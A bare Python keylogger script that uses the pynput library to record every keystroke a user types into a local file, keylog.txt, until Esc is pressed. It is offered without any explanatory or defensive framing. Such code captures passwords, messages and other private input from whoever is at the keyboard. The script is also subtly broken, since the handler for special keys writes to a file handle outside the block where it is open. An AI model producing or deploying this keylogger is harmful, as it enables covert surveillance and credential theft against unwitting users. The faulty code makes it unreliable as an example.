import pynput
from pynput.keyboard import Key, Listener

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        if key == Key.space:
            f.write(" ")
        elif key == Key.enter:
            f.write("\n")
        elif key == Key.tab:
            f.write("\t")
        elif key == Key.backspace:
            f.write("<BACKSPACE>")
        elif key == Key.delete:
            f.write("<DELETE>")
        elif key == Key.esc:
            return False  # Stop listener
    return True

with Listener(on_press=on_press) as listener:
    listener.join()
